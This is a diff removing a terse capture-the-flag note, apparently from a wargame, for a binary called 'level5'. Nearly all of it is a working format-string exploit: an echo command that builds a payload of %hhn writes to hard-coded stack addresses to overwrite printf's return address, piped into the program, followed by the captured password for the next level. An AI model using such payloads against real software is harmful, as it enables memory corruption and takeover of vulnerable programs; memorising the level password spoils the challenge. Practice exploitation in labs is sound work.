@@ -1,6 +1,0 @@
-Here we change the return addr of printf
-
-$>echo -e "AAAA%12\$hhnAAAA%13\$hhnAA\xfc\xf4\xff\xbf\xfd\xf4\xff\xbf\xfe\xf4\xff\xbf\xff\xf4\xff\xbfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%11\$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%10\$hhn" > test ; cat test - | ./level5
-
-password lvl6 : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
-
